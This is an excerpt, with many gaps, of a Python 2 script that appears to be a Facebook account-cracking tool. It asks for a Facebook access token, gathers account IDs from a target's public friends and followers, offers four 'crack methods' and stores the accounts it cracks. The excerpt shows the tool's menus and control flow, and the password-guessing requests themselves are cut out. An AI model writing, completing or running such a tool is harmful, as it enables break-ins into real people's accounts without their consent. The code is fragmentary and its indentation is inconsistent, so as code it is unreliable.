...
loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;95m\x1b[1;95mTool Username \x1b[1;95m»» \x1b[1;95m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;95m \x1b[1;95mTool Password  \x1b[1;95m» \x1b[1;95m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username 
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;95mWrong Password"
...
def logo():
  os.system("clear")
  print """ \033[0;95m
 _______ __________________ _______  _______  _______ 
...
def login():
  ...
  try:
    ...
    print(" [?] Type '\033[0;95mhelp\033[0;95m' to see how to get a Facebook token")
    token = raw_input("\n [+] Enter Token : ")
    if token == "":
    ...
    try:
      ...
      print("\n [+]    Active user, welcome  \033[0;95m%s\033[0;95m"%(nama))
      time.sleep(1)
      menu()
    except KeyError:
...
def menu():
  ...
  try:
    ...
    exit(" [!] no internet connection")
  logo()
  print("   	        [Welcome \033[0;95m%s\033[0;97m ]\n"%(nama)).center(50)
  print(" \033[0;95m[1] \033[0;95mcrack from public friend")
  print(" [2] \033[0;95mcrack from public followers")
  print(" [3] \033[0;95mcrack from multi target ")
  print(" [4\033[0;95m] see crack result")
  print(" [5] \033[0;95mcheck the crack result option")
  print(" [6] \033[0;95muser-agent settings")
  print(" [\033[0;95m0\033[0;95m] exit (remove token)")
  emon = raw_input("\n [?] choose : ")
  if emon == "":
    menu()
  elif emon == "1":
    ...
    if cek =="":
      ...
      print(" [#] ----------------------------------------------")
      print(" [+] crack result : %s total : %s\033[0;95m"%(del_txt, len(totalok)))
      ...
      del_txt = nm_file.replace(".txt", "")
      print(" [#] ----------------------------------------------")
      print(" [+] crack result : %s total : %s\033[0;95m"%(del_txt, len(totalcp)))
...
def publik():
  ...
  print(" [+] total id  : \033[0;95m%s\033[0;95m"%(len(id))) 
...
def method():
  print(" \n\033[0;95m [ choose one crack method]\n")
  print(" [1] \033[0;95mapi method (fast crack)")
  print(" [2]\033[0;95m free method (fast crack) [not for BD user]")
  print(" [3]\033[0;95m mbasic method (slow crack)")
  print(" [4]\033[0;95m mobile method (slow crack)")
  method = raw_input("\n [+] method : ")
  if method == "":
    menu()
  elif method == "1":
